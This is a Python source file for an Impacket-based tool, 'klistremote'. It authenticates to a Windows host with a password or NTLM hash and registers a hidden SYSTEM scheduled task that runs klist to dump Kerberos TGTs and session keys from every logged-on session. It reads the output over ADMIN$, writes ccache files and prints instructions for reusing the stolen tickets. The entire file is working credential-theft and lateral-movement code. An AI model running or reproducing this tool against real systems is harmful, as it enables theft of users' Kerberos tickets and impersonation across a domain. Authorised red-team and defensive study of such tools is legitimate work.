#!/usr/bin/env python3
"""
klistremote – Remote TGT dump via Task Scheduler + SMB

Connects to a Windows host (SMB + Task Scheduler), runs klist sessions and
klist tgt -li <id> for each discovered Kerberos session (excluding :Network),
parses TGTs and writes MIT ccache files. See README for details and OPSEC.

Usage:
  klistremote [[domain/]username[:password]@]target
  klistremote -hashes :NTHASH user@target -o ./ccaches
"""

from __future__ import print_function

import argparse
import logging
import os
import re
import struct
import string
import random
import sys
import time
from datetime import datetime, timezone

# Impacket
from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, tsch
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import (
    RPC_C_AUTHN_GSS_NEGOTIATE,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
)


# ─── klist text parser (inlined from klist2ccache logic) ─────────────────────

def _parse_klist(text):
    """Parse output of `klist tgt [-li 0x...]` into a credential dict."""

    def field(pat, default=""):
        m = re.search(pat, text, re.IGNORECASE)
        return m.group(1).strip() if m else default

    def parse_time(s):
        if not s:
            return 0
        for fmt in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
            try:
                return int(
                    datetime.strptime(s.strip(), fmt)
                    .replace(tzinfo=timezone.utc)
                    .timestamp()
                )
            except ValueError:
                pass
        return 0

    ticket_hex = []
    for m in re.finditer(
        r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE
    ):
        ticket_hex.append(re.sub(r"[^0-9a-fA-F]", "", m.group(1)))
    ticket_bytes = bytes.fromhex("".join(ticket_hex)) if ticket_hex else b""

    raw = re.sub(
        r"\s+",
        "",
        field(r"KeyLength\s+\d+\s+-\s+([0-9a-fA-F][0-9a-fA-F ]*)"),
    )
    try:
        key_bytes = bytes.fromhex(raw) if raw else b"\x00" * 32
    except ValueError:
        key_bytes = b"\x00" * 32

    return {
        "client": field(r"ClientName\s*:\s*(.+)"),
        "realm": field(r"DomainName\s*:\s*(.+)"),
        "sname": [
            field(r"ServiceName\s*:\s*(.+)"),
            field(r"TargetDomainName\s*:\s*(.+)"),
        ],
        "flags": int(field(r"Ticket Flags\s*:\s*(0x[0-9a-fA-F]+)", "0x0"), 16),
        "key_type": int(field(r"KeyType\s+(0x[0-9a-fA-F]+)", "0x12"), 16),
        "key_data": key_bytes,
        "auth_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "start_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "end_time": parse_time(field(r"EndTime\s*:\s*(.+?)\s*\(local\)")),
        "renew_till": parse_time(field(r"RenewUntil\s*:\s*(.+?)\s*\(local\)")),
        "ticket_data": ticket_bytes,
    }


# ─── ccache writer (MIT credential cache v4, inlined) ───────────────────────

def _write_ccache(info, path):
    def p16(n):
        return struct.pack(">H", n)

    def p32(n):
        return struct.pack(">I", n)

    def cnt(b):
        return p32(len(b)) + b

    def principal(name, realm, ntype=1):
        parts = name.split("/") if "/" in name else [name]
        out = p32(ntype) + p32(len(parts)) + cnt(realm.encode())
        for component in parts:
            out += cnt(component.encode())
        return out

    hdr = b"\x05\x04"
    tag = p16(1) + p16(8) + struct.pack(">I", 0xFFFFFFFF) + p32(0)
    hdr += p16(len(tag)) + tag

    default_p = principal(info["client"], info["realm"])
    cred = principal(info["client"], info["realm"])
    cred += principal("/".join(info["sname"]), info["realm"], 1)
    cred += p16(info["key_type"])
    cred += p16(0)
    cred += p16(len(info["key_data"])) + info["key_data"]
    cred += struct.pack(
        ">IIII",
        info["auth_time"],
        info["start_time"],
        info["end_time"],
        info["renew_till"],
    )
    cred += b"\x00"
    cred += p32(info["flags"])
    cred += p32(0)
    cred += p32(0)
    cred += cnt(info["ticket_data"])
    cred += cnt(b"")

    with open(path, "wb") as f:
        f.write(hdr + default_p + cred)
    return path


# ─── Session list parser ────────────────────────────────────────────────────

# Any Kerberos type except Kerberos:Network (e.g. Interactive, RemoteInteractive, etc.)
SESSION_LINE = re.compile(
    r"\[\d+\]\s+Session\s+\d+\s+0:(0x[0-9a-fA-F]+)\s+(.+?)\s+Kerberos:\S+\s*$"
)


def parse_klist_sessions(text):
    """Extract (logon_id_hex, account) for Kerberos sessions; exclude only Kerberos:Network."""
    sessions = []
    for line in text.splitlines():
        line = line.strip()
        if "Kerberos" not in line or "Kerberos:Network" in line:
            continue
        m = SESSION_LINE.search(line)
        if m:
            logon_hex = m.group(1).strip()
            account = m.group(2).strip()
            if logon_hex and account:
                sessions.append((logon_hex, account))
    return sessions


# ─── Remote execution via Task Scheduler + SMB file read ──────────────────────

def _xml_escape(data):
    replace_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    return "".join(replace_table.get(c, c) for c in data)


def run_remote_cmd_and_read_output(smb, dce, command, temp_basename, max_wait=60, retries=20):
    """
    Run `command` on target via Task Scheduler; command must write its output
    to C:\\Windows\\Temp\\<temp_basename>. We then read ADMIN$\\Temp\\<temp_basename>
    via SMB. Returns decoded string content, or None on failure.
    """
    # Redirect command output to a file so we can read via SMB (avoids atexec tmp race)
    args = '/c "' + command + ' > C:\\Windows\\Temp\\' + temp_basename + '"'

    tmp_name = "".join([random.choice(string.ascii_letters) for _ in range(8)])
    xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
""" % (_xml_escape(args),)

    try:
        tsch.hSchRpcRegisterTask(dce, "\\" + tmp_name, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
        tsch.hSchRpcRun(dce, "\\" + tmp_name)
    except Exception as e:
        logging.error("Task create/run failed: %s" % e)
        try:
            tsch.hSchRpcDelete(dce, "\\" + tmp_name)
        except Exception:
            pass
        return None

    # Wait for task to complete
    deadline = time.time() + max_wait
    done = False
    while time.time() < deadline and not done:
        try:
            resp = tsch.hSchRpcGetLastRunInfo(dce, "\\" + tmp_name)
            if resp["pLastRuntime"]["wYear"] != 0:
                done = True
                break
        except Exception:
            pass
        time.sleep(2)

    try:
        tsch.hSchRpcDelete(dce, "\\" + tmp_name)
    except Exception:
        pass

    if not done:
        logging.error("Task did not complete in time")
        return None

    time.sleep(2)  # Allow filesystem to flush before first read

    # Read output file via SMB (with retries for STATUS_OBJECT_NAME_NOT_FOUND)
    smb_path = "Temp\\" + temp_basename
    for attempt in range(retries):
        try:
            data = []
            smb.getFile("ADMIN$", smb_path, lambda d, off=0: data.append(d))
            return b"".join(data).decode("utf-8", errors="replace")
        except Exception as e:
            if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "0xc0000034" in str(e):
                if attempt < retries - 1:
                    time.sleep(3)
                    continue
            logging.error("Failed to read %s: %s" % (smb_path, e))
            return None
    return None


# ─── Main flow ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Dump remote Kerberos TGT sessions and convert to ccache files",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "target",
        action="store",
        help="[[domain/]username[:password]@]target",
    )
    parser.add_argument(
        "-o", "--output-dir",
        default=".",
        help="Directory to write .ccache files (default: current)",
    )
    parser.add_argument(
        "-ts",
        action="store_true",
        help="Adds timestamp to every logging output",
    )
    parser.add_argument(
        "-debug",
        action="store_true",
        help="Turn DEBUG output ON",
    )

    group = parser.add_argument_group("authentication")
    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass",
        action="store_true",
        help="Don't ask for password (useful for -k)",
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, "
        "it will use the ones specified in the command line",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key to use for Kerberos Authentication (128 or 256 bits)",
    )
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If omitted it will use the domain "
        "part (FQDN) specified in the target parameter",
    )
    group.add_argument(
        "-keytab",
        action="store",
        help="Read keys for SPN from keytab file",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    print(version.BANNER)
    logger.init(args.ts)
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    domain, username, password, address = parse_target(args.target)
    if domain is None:
        domain = ""

    if args.keytab is not None:
        from impacket.krb5.keytab import Keytab
        Keytab.loadKeysFromKeytab(args.keytab, username, domain, args)
        args.k = True

    if (
        password == ""
        and username != ""
        and args.hashes is None
        and args.no_pass is False
        and args.aesKey is None
    ):
        from getpass import getpass
        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    if not password and not args.hashes and not args.k:
        logging.error("Provide password or -hashes or -k")
        sys.exit(1)

    logging.warning("This will work ONLY on Windows >= Vista")

    lmhash = ""
    nthash = ""
    if args.hashes:
        lmhash, nthash = args.hashes.split(":")

    os.makedirs(args.output_dir, exist_ok=True)

    # Use same auth flow as atexec: transport owns credentials and connection,
    # with RPC-level auth (PKT_PRIVACY) so Task Scheduler accepts the connection.
    logging.info("Connecting to %s ..." % address)
    stringbinding = r"ncacn_np:%s[\pipe\atsvc]" % address
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    if hasattr(rpctransport, "set_credentials"):
        rpctransport.set_credentials(
            username,
            password,
            domain,
            lmhash,
            nthash,
            args.aesKey,
        )
        rpctransport.set_kerberos(args.k, args.dc_ip)

    try:
        dce = rpctransport.get_dce_rpc()
        dce.set_credentials(*rpctransport.get_credentials())
        if args.k:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
    except Exception as e:
        logging.error("Task Scheduler connect/bind failed: %s" % e)
        sys.exit(1)

    smb = rpctransport.get_smb_connection()

    # 1) Get klist sessions output
    sess_basename = "klist_sess_%s.txt" % "".join(random.choice(string.ascii_letters) for _ in range(6))
    logging.info("Running remote: klist sessions ...")
    sessions_text = run_remote_cmd_and_read_output(
        smb, dce, "klist sessions", sess_basename
    )
    if sessions_text is None:
        dce.disconnect()
        sys.exit(1)

    if args.debug:
        print(sessions_text)

    sessions = parse_klist_sessions(sessions_text)
    if not sessions:
        logging.warning("No Kerberos sessions found in klist sessions output")
        dce.disconnect()
        sys.exit(0)

    logging.info("Found %d session(s) to dump:" % len(sessions))
    for logon_hex, account in sessions:
        logging.info("  - %s  (LogonId %s)" % (account, logon_hex))

    written = []
    for i, (logon_hex, account) in enumerate(sessions, 1):
        lid = logon_hex.lower()
        if not lid.startswith("0x"):
            lid = "0x" + lid
        tgt_basename = "klist_tgt_%s.txt" % lid.replace("0x", "")
        cmd = "klist tgt -li %s" % lid
        logging.info("[%d/%d] %s (0x%s) ..." % (i, len(sessions), account, lid.replace("0x", "")))
        tgt_text = run_remote_cmd_and_read_output(smb, dce, cmd, tgt_basename)
        if not tgt_text:
            continue
        info = _parse_klist(tgt_text)
        if not info["ticket_data"]:
            logging.error("  No ticket data")
            continue
        safe_name = re.sub(r"[^\w@.-]", "_", "%s@%s" % (info["client"], info["realm"]))
        out_path = os.path.join(args.output_dir, safe_name + ".ccache")
        if os.path.exists(out_path):
            idx = 1
            while os.path.exists(out_path):
                out_path = os.path.join(args.output_dir, "%s_%d.ccache" % (safe_name, idx))
                idx += 1
        _write_ccache(info, out_path)
        written.append(out_path)
        logging.info("  -> %s" % out_path)

    dce.disconnect()

    if written:
        logging.info("")
        logging.info("Done. %d ccache(s) written to %s" % (len(written), args.output_dir))
        logging.info("")
        logging.info("Use with impacket:")
        logging.info("  export KRB5CCNAME=%s" % (written[0] if len(written) == 1 else "<path-to.ccache>"))
        logging.info("  impacket-smbclient -k -no-pass domain/user@target")
    else:
        logging.error("No ccache files written")
        sys.exit(1)


if __name__ == "__main__":
    main()
